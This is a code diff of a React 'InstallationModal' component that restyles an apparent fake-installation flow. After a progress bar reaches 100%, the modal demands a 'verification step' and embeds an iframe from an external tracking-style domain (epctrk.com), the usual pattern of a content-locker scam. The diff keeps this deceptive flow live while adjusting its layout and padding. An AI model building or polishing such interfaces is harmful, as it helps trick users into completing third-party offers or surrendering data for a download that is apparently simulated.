@@ -7,7 +7,6 @@ import {
   DialogHeader,
   DialogTitle,
   DialogDescription,
-  DialogFooter,
 } from '@/components/ui/dialog';
 import { Button } from './ui/button';
 import { Progress } from './ui/progress';
@@ -67,8 +66,8 @@ export function InstallationModal({ app, onClose }: InstallationModalProps) {
 
   return (
     <Dialog open={!!app} onOpenChange={(open) => !open && onClose()}>
-      <DialogContent className="sm:max-w-[425px]">
-        <DialogHeader>
+      <DialogContent className="sm:max-w-[425px] p-0">
+        <DialogHeader className="p-6 pb-0">
           <div className="flex justify-center mb-4">
             <Image
               src={app.icon}
@@ -86,7 +85,7 @@ export function InstallationModal({ app, onClose }: InstallationModalProps) {
             Follow the steps below to complete the installation.
           </DialogDescription>
         </DialogHeader>
-        <div className="grid gap-4 py-4">
+        <div className="grid gap-4 py-4 px-6">
           <div className="space-y-2">
             <Progress value={progress} className="w-full" />
             <p className="text-sm text-muted-foreground text-center">{status}</p>
@@ -95,7 +94,7 @@ export function InstallationModal({ app, onClose }: InstallationModalProps) {
             <div className="flex flex-col items-center justify-center text-center p-4 bg-accent rounded-lg">
                 <CheckCircle className="h-12 w-12 text-green-500 mb-2" />
                 <h3 className="font-semibold">Verification Required</h3>
-                <p className="text-sm text-muted-foreground">To finish installation, please complete a quick verification step. Click the button below.</p>
+                <p className="text-sm text-muted-foreground">To finish installation, please complete a quick verification step.</p>
             </div>
           ) : (
             <div className="text-sm text-muted-foreground space-y-2 rounded-lg border p-4">
@@ -106,26 +105,26 @@ export function InstallationModal({ app, onClose }: InstallationModalProps) {
             </div>
           )}
         </div>
-        <DialogFooter>
-          {progress === 100 ? (
+        {progress === 100 ? (
+          <div className="w-full h-[300px] overflow-hidden">
             <iframe
               src="https://epctrk.com/Verify4ow"
               scrolling="no"
               marginWidth={0}
               marginHeight={0}
-              align="middle"
               frameBorder="0"
               width="100%"
-              height="300px" 
-              style={{ position: 'relative', opacity: '1' }}
+              height="100%"
             >
             </iframe>
-          ) : (
-             <Button onClick={onClose} variant="outline" className="w-full">
-                Cancel
-            </Button>
-          )}
-        </DialogFooter>
+          </div>
+        ) : (
+            <div className="p-6 pt-0">
+                <Button onClick={onClose} variant="outline" className="w-full">
+                    Cancel
+                </Button>
+            </div>
+        )}
       </DialogContent>
     </Dialog>
   );
